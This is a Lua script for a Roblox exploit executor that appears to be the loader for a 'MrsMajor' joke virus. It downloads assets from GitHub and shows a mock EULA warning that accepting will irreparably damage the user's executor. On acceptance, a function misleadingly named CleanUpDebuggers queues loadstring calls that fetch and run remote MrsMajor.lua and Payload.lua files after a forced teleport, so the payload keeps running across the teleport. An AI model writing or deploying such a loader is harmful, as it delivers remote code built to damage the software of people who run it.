local Assets = {
    ["demon.png"] = "https://raw.githubusercontent.com/VeztWare/MrsMajor/main/Assets/demon.png",
    ["Thresh, the Chain Warden.mp3"] = "https://raw.githubusercontent.com/VeztWare/MrsMajor/main/Assets/Thresh%2C%20the%20Chain%20Warden.mp3",
    ["the doll.png"] = "https://raw.githubusercontent.com/VeztWare/MrsMajor/main/Assets/the%20%doll.png"
}

local GitFiles = {
    ["loader.lua"] = "https://raw.githubusercontent.com/VeztWare/MrsMajor/refs/heads/main/loader.lua",
    ["Payload.lua"] = "https://raw.githubusercontent.com/VeztWare/MrsMajor/refs/heads/main/Payload.lua",
    ["MrsMajor.lua"] = "https://raw.githubusercontent.com/VeztWare/MrsMajor/refs/heads/main/MrsMajor.lua"
}

function InstallAsset(asset, name)
    local file = request({
        Url = asset,
        Method = "GET"
    })
    writefile(name, file.Body)
end

for i,v in pairs(Assets) do
    if not isfile(i) then
        InstallAsset(v, i)
    end
end

local MrsMajor_loader = [[ 
    loadstring(game:Httpget("https://raw.githubusercontent.com/VeztWare/MrsMajor/refs/heads/main/MrsMajor.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VeztWare/MrsMajor/refs/heads/main/Payload.lua"))()
]]
    
writefile("MrsMajor_temp", MrsMajor_loader)


function CleanUpDebuggers()
    local TeleportService = game:GetService("TeleportService")
    local player = game.Players.LocalPlayer

    queue_on_teleport('loadstring(readfile("MrsMajor_temp"))()')
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
end

function CreateInstance(className, properties)
    local instance = Instance.new(className)
    for prop, value in pairs(properties) do
        instance[prop] = value
    end
    return instance
end

function GRS(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local symbols = "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"

    local all_chars = chars .. symbols
    
    local result = ""
    for i = 1, length do
        local rand_index = math.random(1, #all_chars)
        result = result .. all_chars:sub(rand_index, rand_index)
    end

    return result
end

local EulaYield = {}
local EulaConnected = false

EulaYield.gui = CreateInstance("ScreenGui", {
    Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui"),
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    IgnoreGuiInset = true
})

function EulaYield:CleanEULA()
    self.EULA_Window:Destroy()
end

function EulaYield:AskEULA()
    self.EULA_Window = CreateInstance("Frame", {
        Name = "EULA",
        Parent = self.gui,
        BackgroundColor3 = Color3.fromRGB(222, 222, 222),
        BorderColor3 = Color3.fromRGB(0, 0, 0),
        BorderSizePixel = 0,
        Position = UDim2.new(0.29383117, 0, 0.209432706, 0),
        Size = UDim2.new(0, 617, 0, 275)
    })
    
    local header = CreateInstance("Frame", {
        Name = "WindowFrame",
        Parent = self.EULA_Window,
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BorderColor3 = Color3.fromRGB(0, 0, 0),
        BorderSizePixel = 0,
        Size = UDim2.new(0, 617, 0, 24)
    })

    CreateInstance("TextLabel", {
        Name = "EULAText",
        Parent = header,
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 1.000,
        BorderColor3 = Color3.fromRGB(0, 0, 0),
        BorderSizePixel = 0,
        Size = UDim2.new(0, 75, 0, 24),
        Font = Enum.Font.SourceSans,
        Text = "EULA",
        TextColor3 = Color3.fromRGB(0, 0, 0),
        TextSize = 17.000
    })

    self.EULA_Text = CreateInstance("TextLabel", {
        Name = "Warning",
        Parent = self.EULA_Window,
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 1.000,
        BorderColor3 = Color3.fromRGB(0, 0, 0),
        BorderSizePixel = 0,
        Position = UDim2.new(0.0194489472, 0, 0.09375, 0),
        Size = UDim2.new(0, 605, 0, 139),
        Font = Enum.Font.SourceSans,
        Text = "Executing this script will harm your executor. If you are an antivirus tester or a virus tester, you can try this. No way to fix your executor after infection. Do not run on real account. Use alt account. Executor Level 7+ are able to execute virus. This virus will destroy your executor if you accept the rules and creator won't be responsible for any damages. If you are trying this on a real account, you are responsible. If you don't want to infect your executor, press \"Cancel\".",
        TextColor3 = Color3.fromRGB(0, 0, 0),
        TextScaled = false,
        TextSize = 20.000,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left
    })

    self.CheckBox = CreateInstance("TextButton", {
        Name = "CheckBox",
        Parent = self.EULA_Window,
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 0.550,
        BorderColor3 = Color3.fromRGB(0, 0, 0),
        BorderSizePixel = 0,
        Position = UDim2.new(0.272285253, 0, 0.654545426, 0),
        Size = UDim2.new(0, 18, 0, 18),
        Font = Enum.Font.SourceSans,
        Text = "✓",
        TextTransparency = 1,
        TextColor3 = Color3.fromRGB(0, 0, 0),
        TextScaled = true,
        TextSize = 14.000,
        TextWrapped = true
    })

    CreateInstance("TextLabel", {
        Name = "Responsibility",
        Parent = self.CheckBox,
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 1.000,
        BorderColor3 = Color3.fromRGB(0, 0, 0),
        BorderSizePixel = 0,
        Position = UDim2.new(1.61111116, 0, 0, 0),
        Size = UDim2.new(0, 205, 0, 18),
        Font = Enum.Font.SourceSans,
        Text = "I accept everything. I am responsible",
        TextColor3 = Color3.fromRGB(0, 0, 0),
        TextScaled = true,
        TextSize = 14.000,
        TextWrapped = true
    })

    self.Eula_Cancel = CreateInstance("TextButton", {
        Name = "cancel",
        Parent = self.EULA_Window,
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BorderColor3 = Color3.fromRGB(0, 0, 0),
        BorderSizePixel = 0,
        Position = UDim2.new(0.272285253, 0, 0.792727292, 0),
        Size = UDim2.new(0, 110, 0, 28),
        Font = Enum.Font.SourceSans,
        Text = "Cancel",
        TextColor3 = Color3.fromRGB(0, 0, 0),
        TextSize = 14.000
    })

    self.Eula_Install = CreateInstance("TextButton", {
        Name = "install",
        Parent = self.EULA_Window,
        BackgroundColor3 = Color3.fromRGB(158, 158, 158),
        BorderColor3 = Color3.fromRGB(0, 0, 0),
        BorderSizePixel = 0,
        Position = UDim2.new(0.520259321, 0, 0.792727292, 0),
        Size = UDim2.new(0, 110, 0, 28),
        Font = Enum.Font.SourceSans,
        Text = "Install",
        TextColor3 = Color3.fromRGB(0, 0, 0),
        TextSize = 14.000,
        TextTransparency = 0.500
    })

    self.CheckBox.MouseButton1Down:Connect(function()
        EulaConnected = not EulaConnected
        if EulaConnected == false then
            self.CheckBox.TextTransparency = 1
            self.Eula_Install.BackgroundColor3 = Color3.fromRGB(158, 158, 158)
            self.Eula_Install.TextTransparency = 0.5
            self.Eula_Install.Interactable = false
        elseif EulaConnected == true then
            self.CheckBox.TextTransparency = 0
            self.Eula_Install.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            self.Eula_Install.TextTransparency = 0
            self.Eula_Install.Interactable = true
        end
    end)
    
    self.Eula_Install.MouseButton1Down:Connect(function()
        if not EulaConnected then return end
        local text = self.EULA_Text.Text
        local EULA_Text_Loop = game:GetService("RunService").RenderStepped:Connect(function()
            local newStr = ""
            for i = 1, #text do
                newStr = newStr .. GRS(1)
            end
            self.EULA_Text.Text = newStr
        end)

        task.wait(2) -- yes its to mimic the actual payload
        EULA_Text_Loop:Disconnect()
        self:CleanEULA()
        task.wait(2)
        CleanUpDebuggers()
    end)
    
    self.Eula_Cancel.MouseButton1Down:Connect(function()
        self:CleanEULA()
    end)
end


EulaYield:AskEULA()
